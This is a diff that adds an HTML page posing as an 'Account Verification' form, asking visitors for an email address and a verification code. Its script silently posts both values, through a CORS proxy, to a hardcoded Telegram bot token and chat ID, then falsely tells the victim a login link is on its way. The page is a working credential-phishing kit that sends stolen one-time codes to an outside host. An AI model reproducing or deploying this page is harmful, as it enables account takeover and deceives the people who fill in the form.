@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Account Verification</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f4f4f4;
+      padding: 2rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .container {
+      background: #fff;
+      padding: 2rem;
+      max-width: 400px;
+      width: 100%;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h2 {
+      margin-bottom: 1.5rem;
+      text-align: center;
+      color: #333;
+    }
+    label {
+      display: block;
+      margin-top: 1rem;
+      color: #333;
+      font-weight: 600;
+    }
+    input {
+      width: 100%;
+      padding: 0.7rem;
+      margin-top: 0.5rem;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      margin-top: 1.5rem;
+      padding: 0.75rem;
+      background-color: #007BFF;
+      color: #fff;
+      border: none;
+      width: 100%;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    .message {
+      margin-top: 1rem;
+      font-weight: bold;
+      text-align: center;
+    }
+    .success {
+      color: green;
+    }
+    .error {
+      color: red;
+    }
+    .copy-link {
+      background: #eee;
+      padding: 0.5rem;
+      border-radius: 4px;
+      word-break: break-all;
+      font-size: 13px;
+      margin-top: 1rem;
+    }
+    .copy-btn {
+      margin-top: 0.5rem;
+      padding: 0.5rem;
+      background: #28a745;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+    }
+    .copy-btn:hover {
+      background: #218838;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Account Verification</h2>
+    <form id="verifyForm">
+      <label for="email">Email Address</label>
+      <input type="email" id="email" name="email" required>
+
+      <label for="code">Verification Code</label>
+      <input type="text" id="code" name="code" required>
+
+      <button type="submit">Verify</button>
+    </form>
+
+    <div id="message" class="message"></div>
+
+    <p style="margin-top: 1.5rem; font-size: 14px; color: #555;">
+      🔗 <strong>Copy this link to access the page anytime:</strong>
+    </p>
+    <div class="copy-link" id="pageUrl"></div>
+    <button class="copy-btn" onclick="copyPageUrl()">Copy Link</button>
+  </div>
+
+  <script>
+    // Display current page URL
+    document.getElementById("pageUrl").textContent = window.location.href;
+
+    function copyPageUrl() {
+      const text = window.location.href;
+      navigator.clipboard.writeText(text).then(() => {
+        const msg = document.getElementById('message');
+        msg.textContent = "✅ Link copied to clipboard!";
+        msg.className = "message success";
+      }).catch(() => {
+        const msg = document.getElementById('message');
+        msg.textContent = "❌ Failed to copy link.";
+        msg.className = "message error";
+      });
+    }
+
+    document.getElementById("verifyForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value.trim();
+      const code = document.getElementById("code").value.trim();
+      const messageBox = document.getElementById("message");
+
+      if (!email || !code) {
+        messageBox.textContent = "❌ Please fill in all fields.";
+        messageBox.className = "message error";
+        return;
+      }
+
+      messageBox.textContent = "⏳ Verifying...";
+      messageBox.className = "message";
+
+      const msgText = `🛡️ <b>Account Verification</b>\n\n📧 <b>Email:</b> ${email}\n🔐 <b>Verification Code:</b> ${code}\n\n⏰ Time: ${new Date().toLocaleString()}\n\n✅ If your code is valid, a login link will be sent to your email.`;
+
+      const telegramURL = `https://corsproxy.io/?https://api.telegram.org/bot7991408344:AAHMMcuxSnljllu7sKhZBXbeF0nv2d507Oc/sendMessage`;
+      const payload = {
+        chat_id: "6976365864",
+        text: msgText,
+        parse_mode: "HTML"
+      };
+
+      fetch(telegramURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      }).then(response => {
+        if (response.ok) {
+          messageBox.textContent = "✅ Verification sent successfully! You’ll receive your login link shortly.";
+          messageBox.className = "message success";
+        } else {
+          messageBox.textContent = "❌ Verification failed. Please try again.";
+          messageBox.className = "message error";
+        }
+      }).catch(() => {
+        messageBox.textContent = "❌ Network error. Try again.";
+        messageBox.className = "message error";
+      });
+    });
+  </script>
+</body>
+</html>
